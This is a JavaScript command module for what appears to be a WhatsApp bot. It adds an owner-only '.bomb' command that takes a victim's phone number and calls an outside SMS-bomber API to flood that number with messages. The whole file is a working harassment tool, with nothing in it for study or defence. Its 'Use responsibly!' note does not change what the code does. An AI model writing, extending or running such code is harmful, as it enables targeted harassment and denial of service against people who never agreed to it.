const { cmd } = require("../command");
const fetch = require("node-fetch");

cmd({
  pattern: "bomb",
  alias: ["smsbomb"],
  react: "💣",
  desc: "Trigger SMS bombing (Owner Only)",
  category: "main",
  filename: __filename
}, async (conn, m, msg, { from, isCreator }) => {
  try {
    // Owner check
    if (!isCreator) {
      return conn.sendMessage(from, { text: "❌ Only bot owner can use this command!" }, { quoted: m });
    }

    // Get target number
    const targetJid =
      msg.quoted?.sender ||
      msg.mentionedJid?.[0] ||
      msg.text.split(" ")[1];

    if (!targetJid) {
      return conn.sendMessage(from, { text: "📌 Usage: .bomb 923" }, { quoted: m });
    }

    const number = targetJid.replace("@s.whatsapp.net", "");
    const apiUrl = `https://shadowscriptz.xyz/public_apis/smsbomberapi.php?num=${number}`;

    // Call API
    const response = await fetch(apiUrl);
    if (response.ok) {
      await conn.sendMessage(from, {
        text: `✅ SMS bombing started on *${number}*!\n\n_Note: Use responsibly!_`
      }, { quoted: m });
    } else {
      await conn.sendMessage(from, {
        text: `❌ API failed! Status: ${response.status}`
      }, { quoted: m });
    }

  } catch (error) {
    console.error(error);
    conn.sendMessage(from, { text: `⚠️ Error: ${error.message}` }, { quoted: m });
  }
});